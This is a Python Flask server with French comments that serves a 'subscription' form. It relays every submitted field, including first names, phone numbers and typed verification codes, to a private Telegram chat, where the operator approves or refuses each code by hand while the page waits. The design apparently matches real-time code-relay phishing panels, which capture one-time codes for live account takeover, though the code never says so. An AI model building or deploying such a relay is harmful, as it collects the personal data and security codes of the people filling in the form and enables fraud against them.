import os
import time
import threading
import requests
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

# Variables à définir dans ton environnement (jamais en dur dans le code)
TOKEN = os.environ["TELEGRAM_TOKEN"]      # donné par @BotFather
CHAT_ID = os.environ["TELEGRAM_CHAT_ID"]  # ton identifiant de chat (@userinfobot)
API = f"https://api.telegram.org/bot{TOKEN}"

app = Flask(__name__)
CORS(app)  # autorise ton site à appeler ce serveur

# Demandes en attente de ta décision, gardées en mémoire.
# id -> {"statut": "en_attente" | "valide" | "refuse", "t": horodatage}
demandes = {}
compteur = 0
verrou = threading.Lock()


def envoyer(texte, boutons=None):
    corps = {"chat_id": CHAT_ID, "text": texte, "parse_mode": "Markdown"}
    if boutons:
        corps["reply_markup"] = {"inline_keyboard": boutons}
    return requests.post(f"{API}/sendMessage", json=corps, timeout=10)


@app.route("/")
def accueil():
    # Sert directement le formulaire : c'est le lien à envoyer aux clients
    return send_from_directory(".", "formulaire_abonnement.html")


@app.route("/submit", methods=["POST"])
def submit():
    # Étape 1 : la personne s'inscrit -> tu es juste prévenu
    data = request.form.to_dict() or request.get_json(silent=True) or {}
    if not data:
        return jsonify({"ok": False, "error": "aucune donnée reçue"}), 400

    lignes = ["🔔 *Nouvelle demande d'abonnement*", ""]
    for champ, valeur in data.items():
        lignes.append(f"*{champ}* : {valeur}")
    lignes.append("")
    lignes.append("_Envoie-lui son code, puis valide quand elle le saisira._")
    rep = envoyer("\n".join(lignes))
    return jsonify({"ok": rep.ok})


@app.route("/verifier", methods=["POST"])
def verifier():
    # Étape 2 : la personne tape le code -> tu reçois des boutons Valider / Refuser
    global compteur
    data = request.form.to_dict() or request.get_json(silent=True) or {}
    prenom = data.get("prenom", "")
    telephone = data.get("telephone", "")
    code = (data.get("code") or "").strip()
    if not code:
        return jsonify({"ok": False, "error": "code manquant"}), 400

    with verrou:
        compteur += 1
        rid = str(compteur)
        # On nettoie les vieilles demandes (plus d'1 h)
        maintenant = time.time()
        for k in [k for k, v in demandes.items() if maintenant - v["t"] > 3600]:
            demandes.pop(k, None)
        demandes[rid] = {"statut": "en_attente", "t": maintenant}

    texte = (
        "🔐 *Code saisi — à valider*\n\n"
        f"*prenom* : {prenom}\n"
        f"*telephone* : {telephone}\n"
        f"*code tapé* : `{code}`"
    )
    boutons = [[
        {"text": "✅ Valider", "callback_data": f"ok:{rid}"},
        {"text": "❌ Refuser", "callback_data": f"no:{rid}"},
    ]]
    envoyer(texte, boutons)
    return jsonify({"ok": True, "id": rid})


@app.route("/statut")
def statut():
    # La page interroge régulièrement cette adresse pour connaître ta décision
    rid = request.args.get("id", "")
    with verrou:
        d = demandes.get(rid)
    if not d:
        return jsonify({"statut": "inconnu"})
    return jsonify({"statut": d["statut"]})


def poller():
    # Écoute en continu les clics sur tes boutons Valider / Refuser
    print(">>> POLLER démarré", flush=True)
    offset = 0
    while True:
        try:
            r = requests.get(
                f"{API}/getUpdates",
                params={"offset": offset, "timeout": 25},
                timeout=30,
            )
            rep = r.json()
            if not rep.get("ok", False):
                # Souvent un 409 = un AUTRE serveur écoute le même bot
                print(">>> getUpdates refusé :", rep, flush=True)
                time.sleep(3)
                continue
            for maj in rep.get("result", []):
                offset = maj["update_id"] + 1
                cb = maj.get("callback_query")
                if not cb:
                    continue
                data = cb.get("data", "")
                print(">>> clic reçu :", data, flush=True)
                if ":" not in data:
                    continue
                action, rid = data.split(":", 1)
                with verrou:
                    if rid in demandes:
                        demandes[rid]["statut"] = "valide" if action == "ok" else "refuse"
                        print(">>> demande", rid, "->", demandes[rid]["statut"], flush=True)
                    else:
                        print(">>> demande", rid, "inconnue de CE serveur", flush=True)
                # Confirme le clic et met à jour le message
                requests.post(f"{API}/answerCallbackQuery",
                              json={"callback_query_id": cb["id"], "text": "Enregistré"}, timeout=10)
                deco = "✅ VALIDÉ" if action == "ok" else "❌ REFUSÉ"
                msg = cb["message"]
                requests.post(f"{API}/editMessageText", json={
                    "chat_id": msg["chat"]["id"],
                    "message_id": msg["message_id"],
                    "text": msg.get("text", "") + f"\n\n→ {deco}",
                }, timeout=10)
        except Exception:
            time.sleep(3)


# Démarre l'écoute des boutons UNE SEULE FOIS, à l'intérieur du worker web
# (au premier appel reçu) : ainsi le poller partage la mémoire avec /verifier
# et /statut, et il n'y a qu'un seul écouteur du bot.
_demarre = False

@app.before_request
def _lancer_poller():
    global _demarre
    if _demarre:
        return
    with verrou:
        if _demarre:
            return
        _demarre = True
    threading.Thread(target=poller, daemon=True).start()
    print(">>> POLLER lancé depuis le worker web", flush=True)


if __name__ == "__main__":
    # En local : http://127.0.0.1:5000  (use_reloader=False pour n'avoir qu'une seule écoute)
    app.run(host="0.0.0.0", port=5000, use_reloader=False)